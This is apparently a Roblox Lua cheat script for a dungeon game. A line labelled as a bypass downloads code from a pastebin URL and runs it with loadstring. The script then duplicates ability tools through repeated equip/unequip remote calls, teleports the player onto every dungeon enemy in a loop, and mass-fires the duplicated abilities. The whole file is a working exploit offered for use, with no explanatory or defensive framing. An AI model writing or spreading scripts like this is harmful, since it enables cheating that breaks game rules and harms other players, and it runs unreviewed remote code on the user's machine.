local WhirlID = 4
local ShoutID = 9

-- Bypass
loadstring(game:HttpGet('https://pastebin.com/raw/1e12BgYP'))()

-- Services
local ReplicatedStorage = game.ReplicatedStorage
local Remotes = ReplicatedStorage:WaitForChild("remotes")

-- Assets
local Player = game.Players.LocalPlayer
local Dungeon = workspace:WaitForChild("dungeon")

-- Code
for i = 1, 100 do
local Spell = Player.Backpack:FindFirstChild("Whirlwind")

if (Spell) then
Spell.Parent = Player
Remotes.unequipItem:InvokeServer("ability", WhirlID)
Remotes.equipItem:InvokeServer("ability", WhirlID, "q")
end

local Spell2 = Player.Backpack:FindFirstChild("Battle Shout")

if (Spell2) then
Spell2.Parent = Player
Remotes.unequipItem:InvokeServer("ability", ShoutID)
Remotes.equipItem:InvokeServer("ability", ShoutID, "e")
end
end

for index, value in next, Player:GetChildren() do
if (value:IsA("Tool")) then
value.Parent = Player.Backpack
end
end

local AlreadyUsed = {}

spawn(function()
while wait() do
for index, value in next, Dungeon:GetDescendants() do
if (value:FindFirstChildOfClass("Humanoid") and value ~= Player.Character) then
local Root = value:FindFirstChild("HumanoidRootPart")
if (Root) then
Player.Character:MoveTo(Root.Position)
end
wait()
end
end
end
end)


spawn(function()
for loop = 1, 5 do

spawn(function()
local c = Player.Backpack:GetChildren()

for i = 1, 20 * loop do
if (not AlreadyUsed[c[i]] and c[i].abilitySlot.Value == "e") then
AlreadyUsed[c[i]] = true
c[i]:FindFirstChildWhichIsA("RemoteEvent"):FireServer()
end
end
end)

wait(8)
end
end)

for loop = 1, 20 do

spawn(function()
local c = Player.Backpack:GetChildren()
for i = 1, 5 * loop do
if (not AlreadyUsed[c[i]] and c[i].abilitySlot.Value == "q") then
AlreadyUsed[c[i]] = true
c[i]:FindFirstChildWhichIsA("RemoteEvent"):FireServer()
end
end
end)

wait(2)
end